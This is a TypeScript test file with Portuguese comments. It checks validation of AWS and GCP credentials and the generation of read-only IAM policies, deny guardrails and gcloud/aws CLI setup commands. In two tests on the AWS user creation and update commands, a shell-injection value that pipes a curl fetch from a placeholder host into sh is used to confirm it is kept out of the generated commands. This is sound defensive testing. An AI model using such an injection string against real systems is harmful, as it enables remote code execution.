import { generateKeyPairSync, randomBytes } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import {
  AWS_KEY_ID_FORMAT_MESSAGE,
  AWS_KEY_BODY_FORMAT_MESSAGE,
  AWS_TEMPORARY_KEY_MESSAGE,
  cloudCredentialInputSchema,
  credentialKindAllowed,
  credentialKindFor,
  GCP_KEY_EMAIL_MESSAGE,
  GCP_KEY_FORMAT_MESSAGE,
  GCP_KEY_NOT_SERVICE_ACCOUNT_MESSAGE,
  gcpServiceAccountKeyFromJson,
  isGcpPrivateKeyShape,
} from './cloud-credentials.js';
import {
  AWS_READER_CAPABILITY_ACTIONS,
  AWS_READER_SELF_ACTIONS,
  AWS_READER_USER_SELF_ACTIONS,
  awsGuardrailsPolicy,
  awsReaderUserArn,
  awsReaderUserCommands,
  awsReaderUserPolicy,
  awsReaderUserUpdateCommands,
  gcpReaderCommands,
  gcpReaderSubscription,
  type IamPolicy,
} from './read-keys.js';
import { AWS_READER_CAPABILITIES, type AwsReaderCapability, parseReaderRoleTags } from './aws-reader.js';
import { isPubsubSubscriptionName } from './cloud-accounts.js';

// Chaves geradas na hora, no formato da AWS e do Google: nenhuma chave real no repositório.
const BASE32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
const awsKeyId = (prefix = 'AKIA') =>
  prefix + Array.from(randomBytes(16), (byte) => BASE32.charAt(byte % 32)).join('');
const awsSecret = () => randomBytes(30).toString('base64');
const pem = () =>
  generateKeyPairSync('rsa', { modulusLength: 2048 })
    .privateKey.export({ type: 'pkcs8', format: 'pem' })
    .toString();

function keyFile(overrides: Record<string, unknown> = {}): string {
  return JSON.stringify({
    type: 'service_account',
    project_id: 'cliente-demo-a',
    private_key_id: randomBytes(20).toString('hex'),
    private_key: pem(),
    client_email: 'verax-control-reader@cliente-demo-a.iam.gserviceaccount.com',
    client_id: '111111111111111111111',
    auth_uri: 'https://accounts.google.com/o/oauth2/auth',
    token_uri: 'https://oauth2.googleapis.com/token',
    ...overrides,
  });
}

const issuesOf = (input: unknown) => {
  const result = cloudCredentialInputSchema.safeParse(input);
  return result.success ? [] : result.error.issues.map((issue) => issue.message);
};

describe('chaves de leitura da VM própria do cliente', () => {
  it('as chaves da AWS e da GCP só valem no nó na VM própria; o token do Cloudflare, em todos', () => {
    expect(credentialKindAllowed('cloudflare_api_token', 'gcp')).toBe(true);
    expect(credentialKindAllowed('aws_access_key', 'gcp')).toBe(false);
    expect(credentialKindAllowed('gcp_service_account_key', 'gcp')).toBe(false);
    expect(credentialKindAllowed('aws_access_key', 'vm')).toBe(true);
    expect(credentialKindAllowed('gcp_service_account_key', 'vm')).toBe(true);
    expect(credentialKindFor('aws', 'gcp')).toBeNull();
    expect(credentialKindFor('aws', 'vm')).toBe('aws_access_key');
    expect(credentialKindFor('gcp', 'vm')).toBe('gcp_service_account_key');
    expect(credentialKindFor('cloudflare', 'gcp')).toBe('cloudflare_api_token');
  });

  it('aceita a chave de longo prazo de um usuário IAM', () => {
    const input = { kind: 'aws_access_key', accessKeyId: awsKeyId(), secretAccessKey: awsSecret() };
    expect(cloudCredentialInputSchema.parse(input)).toEqual(input);
  });

  it('recusa a chave temporária, o ID fora do formato e o segredo fora do formato, sem repetir o valor', () => {
    const temporary = awsKeyId('ASIA');
    expect(
      issuesOf({ kind: 'aws_access_key', accessKeyId: temporary, secretAccessKey: awsSecret() }),
    ).toEqual([AWS_TEMPORARY_KEY_MESSAGE]);
    for (const accessKeyId of [awsKeyId().toLowerCase(), `${awsKeyId()}A`, ` ${awsKeyId()}`, 'AKIA']) {
      expect(issuesOf({ kind: 'aws_access_key', accessKeyId, secretAccessKey: awsSecret() })).toEqual([
        AWS_KEY_ID_FORMAT_MESSAGE,
      ]);
    }
    for (const secretAccessKey of [awsSecret().slice(1), `${awsSecret()}\n`, `${awsSecret().slice(1)}ç`]) {
      const messages = issuesOf({ kind: 'aws_access_key', accessKeyId: awsKeyId(), secretAccessKey });
      expect(messages).toEqual([AWS_KEY_BODY_FORMAT_MESSAGE]);
      expect(messages.join(' ')).not.toContain(secretAccessKey.trim());
    }
    expect(
      issuesOf({ kind: 'aws_access_key', accessKeyId: awsKeyId(), secretAccessKey: awsSecret(), token: 'x' }),
    ).not.toEqual([]);
  });

  it('lê o arquivo da chave da conta de serviço e manda só os quatro campos', () => {
    const parsed = gcpServiceAccountKeyFromJson(keyFile());
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(Object.keys(parsed.fields).sort()).toEqual([
      'clientEmail',
      'privateKey',
      'privateKeyId',
      'projectId',
    ]);
    const input = { kind: 'gcp_service_account_key', ...parsed.fields };
    expect(cloudCredentialInputSchema.parse(input)).toEqual(input);
    // Um campo a mais (o token_uri do arquivo, por exemplo) não entra pela rota.
    expect(issuesOf({ ...input, tokenUri: 'https://exemplo.invalid/token' })).not.toEqual([]);
  });

  it.each([
    ['não é JSON', 'isto não é json', GCP_KEY_FORMAT_MESSAGE],
    ['grande demais', `${keyFile()}${' '.repeat(8192)}`, GCP_KEY_FORMAT_MESSAGE],
    [
      'de outro tipo (OAuth de usuário)',
      keyFile({ type: 'authorized_user' }),
      GCP_KEY_NOT_SERVICE_ACCOUNT_MESSAGE,
    ],
    ['sem a chave privada', keyFile({ private_key: undefined }), GCP_KEY_FORMAT_MESSAGE],
    [
      'de um agente de serviço do Google',
      keyFile({ client_email: 'service-1@gcp-sa-logging.iam.gserviceaccount.com' }),
      GCP_KEY_EMAIL_MESSAGE,
    ],
    ['de outro domínio', keyFile({ client_email: 'leitor@exemplo.com' }), GCP_KEY_EMAIL_MESSAGE],
    ['com o ID da chave fora do formato', keyFile({ private_key_id: 'abc' }), GCP_KEY_FORMAT_MESSAGE],
    [
      'com uma chave RSA antiga (PKCS#1)',
      keyFile({ private_key: '-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----\n' }),
      GCP_KEY_FORMAT_MESSAGE,
    ],
  ])('recusa o arquivo %s, com a mensagem certa e sem o conteúdo', (_name, text, message) => {
    const parsed = gcpServiceAccountKeyFromJson(text);
    expect(parsed).toEqual({ ok: false, message });
  });

  it('o PEM da chave é conferido linha a linha', () => {
    const key = pem();
    expect(isGcpPrivateKeyShape(key)).toBe(true);
    expect(isGcpPrivateKeyShape(key.trimEnd())).toBe(true);
    // Uma linha em branco só, logo depois do cabeçalho, já recusa; todas as linhas separadas por uma em branco também.
    const lines = key.split('\n');
    expect(isGcpPrivateKeyShape([lines[0], '', ...lines.slice(1)].join('\n'))).toBe(false);
    expect(isGcpPrivateKeyShape(key.replaceAll('\n', '\n\n'))).toBe(false);
    expect(isGcpPrivateKeyShape(key.replace('-----END', 'x-----END'))).toBe(false);
    expect(isGcpPrivateKeyShape(`${key}${'A'.repeat(4096)}`)).toBe(false);
  });
});

describe('o usuário IAM de leitura da AWS', () => {
  const values = {
    accountId: '111111111111',
    buckets: ['trilha-111111111111', 'guardduty-111111111111'],
    egressIps: ['203.0.113.10/32'],
  };

  /** O arquivo das políticas do papel, no repositório: a fonte das ações de leitura e das negações. */
  const role = JSON.parse(
    readFileSync(
      new URL('../../../infra/cloudformation/verax-control-reader.policy.json', import.meta.url),
      'utf8',
    ),
  ) as Record<'VeraxControlReader' | 'VeraxControlGuardrails', IamPolicy>;
  const bySid = (policy: IamPolicy) =>
    new Map(policy.Statement.map((statement) => [statement.Sid, statement]));

  /** As declarações que cada capacidade soma à política de leitura, no papel e no usuário. */
  const CAPABILITY_SIDS: Record<AwsReaderCapability, readonly string[]> = {
    discovery: ['AutoInspecao', 'ValidarFontes', 'PosturaEAtivos', 'DescobrirFontes'],
    'service-logs': [
      'LerLogsDaAwsDestaConta',
      'ListarLogsDaAwsDestaConta',
      'VerPrimeiroNivelDosBuckets',
      'DecifrarLogsDaAwsSoPeloS3',
    ],
    findings: ['LerAchadosDeSeguranca'],
    'log-groups': ['LerGruposDeLogEtiquetados'],
  };
  const BUCKET_SIDS = ['ListarBucketsDeLog', 'LerObjetosDeLog'];
  const actionsOf = (policy: IamPolicy, sids: readonly string[]) =>
    new Set(
      policy.Statement.filter((statement) => sids.includes(statement.Sid)).flatMap((statement) =>
        [statement.Action].flat(),
      ),
    );

  it('a leitura é a do papel: as mesmas declarações, com a autoinspeção no próprio usuário', () => {
    const user = bySid(awsReaderUserPolicy(values));
    const reader = bySid(role.VeraxControlReader);
    // As mesmas declarações, na mesma ordem (o exemplo do papel tem três buckets; o usuário, dois).
    expect([...user.keys()]).toEqual([...reader.keys()]);
    for (const sid of user.keys()) {
      if (sid === 'AutoInspecao') continue;
      expect(user.get(sid)?.Action, sid).toEqual(reader.get(sid)?.Action);
      expect(user.get(sid)?.Effect, sid).toBe('Allow');
      // Fora os buckets cadastrados, o recurso e a condição são os do papel, com a conta deste usuário.
      if (!BUCKET_SIDS.includes(sid)) {
        expect(user.get(sid)?.Resource, sid).toEqual(reader.get(sid)?.Resource);
        expect(user.get(sid)?.Condition, sid).toEqual(reader.get(sid)?.Condition);
      }
    }
    // A autoinspeção: as etiquetas e a simulação, no próprio usuário (no papel, no próprio papel).
    expect(reader.get('AutoInspecao')?.Action).toEqual([...AWS_READER_SELF_ACTIONS]);
    expect(user.get('AutoInspecao')?.Action).toEqual([...AWS_READER_USER_SELF_ACTIONS]);
    expect(user.get('AutoInspecao')?.Resource).toBe(awsReaderUserArn('111111111111'));
    expect(awsReaderUserArn('111111111111')).toBe(
      'arn:aws:iam::111111111111:user/verax/verax-control-reader',
    );
    expect(user.get('ListarBucketsDeLog')?.Resource).toEqual([
      'arn:aws:s3:::trilha-111111111111',
      'arn:aws:s3:::guardduty-111111111111',
    ]);
    // Os logs da AWS: só a pasta desta conta, e o Decrypt só pelo S3.
    expect(user.get('LerLogsDaAwsDestaConta')?.Resource).toEqual([
      'arn:aws:s3:::*/AWSLogs/111111111111/*',
      'arn:aws:s3:::*/AWSLogs/o-*/111111111111/*',
    ]);
    expect(user.get('VerPrimeiroNivelDosBuckets')?.Condition).toEqual({
      StringEquals: { 's3:delimiter': '/', 's3:prefix': ['', 'AWSLogs', 'AWSLogs/'] },
    });
    expect(user.get('DecifrarLogsDaAwsSoPeloS3')).toMatchObject({
      Resource: '*',
      Condition: { StringLike: { 'kms:ViaService': 's3.*.amazonaws.com' } },
    });
    expect(user.get('LerGruposDeLogEtiquetados')?.Condition).toEqual({
      StringEquals: { 'aws:ResourceTag/verax-control': 'leitura' },
    });
    // Nenhuma ação de escrita na leitura, e nenhum curinga numa ação liberada.
    const actions = awsReaderUserPolicy(values).Statement.flatMap((statement) => [statement.Action].flat());
    expect(
      actions.filter((action) =>
        /:(Put|Create|Delete|Update|Attach|Tag|Untag|Enable|Disable|Start|Stop)/.test(action),
      ),
    ).toEqual([]);
    expect(actions.filter((action) => action.includes('*'))).toEqual([]);
  });

  it('as ações de cada capacidade são as do template, declaração por declaração', () => {
    const reader = role.VeraxControlReader;
    for (const capability of AWS_READER_CAPABILITIES) {
      expect(new Set(AWS_READER_CAPABILITY_ACTIONS[capability]), capability).toEqual(
        actionsOf(reader, CAPABILITY_SIDS[capability]),
      );
    }
    // Tudo o que o papel pode fazer está numa capacidade: os buckets adicionais só repetem ações delas.
    const every = new Set(Object.values(AWS_READER_CAPABILITY_ACTIONS).flat());
    expect(new Set(reader.Statement.flatMap((statement) => [statement.Action].flat()))).toEqual(every);
    expect(reader.Statement.every((statement) => statement.Effect === 'Allow')).toBe(true);
  });

  it('cada autorização soma só as declarações dela; sem nenhuma, só a descoberta', () => {
    const sidsOf = (capabilities: readonly AwsReaderCapability[], buckets: readonly string[] = []) =>
      awsReaderUserPolicy({ ...values, buckets, capabilities }).Statement.map((statement) => statement.Sid);
    expect(sidsOf([])).toEqual(CAPABILITY_SIDS.discovery);
    expect(sidsOf(['discovery'])).toEqual(CAPABILITY_SIDS.discovery);
    for (const capability of ['service-logs', 'findings', 'log-groups'] as const) {
      expect(sidsOf([capability])).toEqual([...CAPABILITY_SIDS.discovery, ...CAPABILITY_SIDS[capability]]);
    }
    expect(sidsOf(['log-groups', 'service-logs'])).toEqual([
      ...CAPABILITY_SIDS.discovery,
      ...CAPABILITY_SIDS['service-logs'],
      ...CAPABILITY_SIDS['log-groups'],
    ]);
    // Sem a lista, as três (o padrão do template).
    expect(
      awsReaderUserPolicy({ ...values, buckets: [] }).Statement.map((statement) => statement.Sid),
    ).toEqual(AWS_READER_CAPABILITIES.flatMap((capability) => CAPABILITY_SIDS[capability]));
    // Um texto qualquer na lista não liga nada.
    expect(sidsOf(['admin' as AwsReaderCapability])).toEqual(CAPABILITY_SIDS.discovery);
  });

  it('os buckets cadastrados: listar e ler; a chave deles, só pelo S3 e só sem a autorização dos logs da AWS', () => {
    const withLogs = bySid(awsReaderUserPolicy(values));
    expect(withLogs.has('ListarBucketsDeLog')).toBe(true);
    expect(withLogs.has('DecifrarSoPeloS3')).toBe(false);
    const withoutLogs = bySid(awsReaderUserPolicy({ ...values, capabilities: ['findings'] }));
    expect(withoutLogs.has('DecifrarLogsDaAwsSoPeloS3')).toBe(false);
    expect(withoutLogs.get('DecifrarSoPeloS3')).toMatchObject({
      Action: 'kms:Decrypt',
      Resource: 'arn:aws:kms:*:111111111111:key/*',
      Condition: { StringLike: { 'kms:ViaService': 's3.*.amazonaws.com' } },
    });
    // Sem bucket e sem a autorização, nada de S3 nem KMS além da descoberta.
    const none = awsReaderUserPolicy({ ...values, buckets: [], capabilities: [] });
    const content = none.Statement.flatMap((statement) => [statement.Action].flat()).filter((action) =>
      ['s3:GetObject', 's3:ListBucket', 'kms:Decrypt'].includes(action),
    );
    expect(content).toEqual([]);
  });

  it('a política de leitura cabe no limite do IAM com dez buckets de nome longo e tudo autorizado', () => {
    const buckets = Array.from(
      { length: 10 },
      (_, index) => `bucket-de-log-com-nome-longo-${index}-111111111111`,
    );
    for (const capabilities of [[...AWS_READER_CAPABILITIES], []] as AwsReaderCapability[][]) {
      const policy = awsReaderUserPolicy({ ...values, buckets, capabilities });
      expect(JSON.stringify(policy).length).toBeLessThan(6144);
    }
    expect(JSON.stringify(awsGuardrailsPolicy(values)).length).toBeLessThan(6144);
  });

  it('as negações são as do papel; a de IP só com o IP da VM', () => {
    const guardrails = bySid(awsGuardrailsPolicy(values));
    const reference = bySid(role.VeraxControlGuardrails);
    expect([...guardrails.keys()]).toEqual([...reference.keys()]);
    for (const sid of [
      'NuncaAlterarLogs',
      'NuncaAlterarOutrasFontes',
      'NuncaTrocarAsPropriasEtiquetas',
      'NuncaAmpliarOProprioAcesso',
    ]) {
      expect(guardrails.get(sid)?.Action, sid).toEqual(reference.get(sid)?.Action);
      expect(guardrails.get(sid)).toMatchObject({ Effect: 'Deny', Resource: '*' });
      expect(guardrails.get(sid)?.Condition).toBeUndefined();
    }
    // A negação de IP, com a exceção do serviço da AWS que age em nome do usuário (o S3 pedindo ao KMS).
    expect(guardrails.get('SoDoNoDaVerax')?.Condition).toEqual({
      NotIpAddress: { 'aws:SourceIp': ['203.0.113.10/32'] },
      Bool: { 'aws:ViaAWSService': 'false' },
    });
    expect(guardrails.get('SoDoNoDaVerax')).toEqual(reference.get('SoDoNoDaVerax'));
    for (const egressIps of [[], ['203.0.113.10'], ['203.0.113.10/24']]) {
      expect(bySid(awsGuardrailsPolicy({ egressIps })).has('SoDoNoDaVerax')).toBe(false);
    }
    // Nenhuma negação cancela uma leitura liberada (a comparação de ações do IAM não distingue maiúsculas).
    const denied = awsGuardrailsPolicy({ egressIps: [] }).Statement.flatMap((statement) =>
      [statement.Action].flat(),
    );
    const allowed = awsReaderUserPolicy(values).Statement.flatMap((statement) => [statement.Action].flat());
    const cancelled = allowed.filter((action) =>
      denied.some((pattern) =>
        pattern.endsWith('*')
          ? action.toLowerCase().startsWith(pattern.slice(0, -1).toLowerCase())
          : action.toLowerCase() === pattern.toLowerCase(),
      ),
    );
    expect(cancelled).toEqual([]);
  });

  it('os comandos criam o usuário com o limite de permissões, as etiquetas e as duas políticas, e a chave', () => {
    const commands = awsReaderUserCommands('111111111111');
    expect(commands).toContain(
      'aws iam create-user --path /verax/ --user-name verax-control-reader --permissions-boundary arn:aws:iam::111111111111:policy/verax/VeraxControlReader',
    );
    expect(commands).toContain('policy/verax/VeraxControlGuardrails');
    expect(commands).toContain('aws iam create-access-key --user-name verax-control-reader');
    // As etiquetas do usuário são as do papel: o modelo e o que foi autorizado, separado por espaço.
    expect(commands).toContain(
      " --tags Key=verax-control:template,Value=2 'Key=verax-control:capabilities,Value=discovery service-logs findings log-groups'\n",
    );
    expect(awsReaderUserCommands('111111111111', ['findings'])).toContain(
      " --tags Key=verax-control:template,Value=2 'Key=verax-control:capabilities,Value=discovery findings'\n",
    );
    // Um texto qualquer na lista não entra no comando que o cliente cola no terminal.
    const hostile = awsReaderUserCommands('111111111111', [
      "x' ; curl exemplo.invalid | sh #" as AwsReaderCapability,
    ]);
    expect(hostile).toContain("'Key=verax-control:capabilities,Value=discovery'\n");
    expect(hostile).not.toContain('curl');
    // E o nó lê de volta o que o comando gravou.
    expect(
      parseReaderRoleTags([
        { Key: 'verax-control:template', Value: '2' },
        { Key: 'verax-control:capabilities', Value: 'discovery findings' },
      ]),
    ).toEqual({ templateVersion: 2, capabilities: ['discovery', 'findings'] });
  });

  it('os comandos de atualização gravam uma versão nova da política de leitura e as etiquetas do usuário', () => {
    expect(awsReaderUserUpdateCommands('111111111111').split('\n')).toEqual([
      'aws iam create-policy-version --policy-arn arn:aws:iam::111111111111:policy/verax/VeraxControlReader --policy-document file://verax-control-reader.json --set-as-default',
      "aws iam tag-user --user-name verax-control-reader --tags Key=verax-control:template,Value=2 'Key=verax-control:capabilities,Value=discovery service-logs findings log-groups'",
    ]);
    // Com as autorizações escolhidas, a etiqueta diz só as escolhidas (a descoberta vale sempre).
    expect(awsReaderUserUpdateCommands('111111111111', ['findings'])).toContain(
      " --tags Key=verax-control:template,Value=2 'Key=verax-control:capabilities,Value=discovery findings'",
    );
    expect(awsReaderUserUpdateCommands('111111111111', [])).toContain(
      "'Key=verax-control:capabilities,Value=discovery'",
    );
    // As etiquetas são as mesmas que a criação do usuário grava: o nó lê as duas do mesmo jeito.
    const tags = (commands: string) => commands.split(' --tags ')[1]?.split('\n')[0];
    expect(tags(awsReaderUserUpdateCommands('111111111111', ['service-logs', 'log-groups']))).toBe(
      tags(awsReaderUserCommands('111111111111', ['service-logs', 'log-groups'])),
    );
    // Só a política de leitura muda: a de negações, a chave de acesso e o próprio usuário ficam como estão.
    const update = awsReaderUserUpdateCommands('111111111111');
    expect(update).not.toContain('VeraxControlGuardrails');
    expect(update).not.toContain('create-access-key');
    expect(update).not.toContain('create-user');
    // Um texto qualquer na lista não entra no comando que o cliente cola no terminal.
    const hostile = awsReaderUserUpdateCommands('111111111111', [
      "x' ; curl exemplo.invalid | sh #" as AwsReaderCapability,
    ]);
    expect(hostile).toContain("'Key=verax-control:capabilities,Value=discovery'");
    expect(hostile).not.toContain('curl');
  });
});

describe('a leitura da GCP na VM própria', () => {
  it('os comandos criam tudo no projeto do cliente, com a conta de serviço só na assinatura', () => {
    const commands = gcpReaderCommands('cliente-demo-a');
    expect(commands).toContain('gcloud pubsub topics create verax-control-security --project=cliente-demo-a');
    expect(commands).toContain(
      '--member=serviceAccount:verax-control-reader@cliente-demo-a.iam.gserviceaccount.com --role=roles/pubsub.subscriber',
    );
    expect(commands).toContain('gcloud pubsub subscriptions add-iam-policy-binding verax-control-security');
    // Nenhum papel no projeto inteiro.
    expect(commands).not.toContain('projects add-iam-policy-binding');
    expect(isPubsubSubscriptionName(gcpReaderSubscription('cliente-demo-a'))).toBe(true);
  });
});
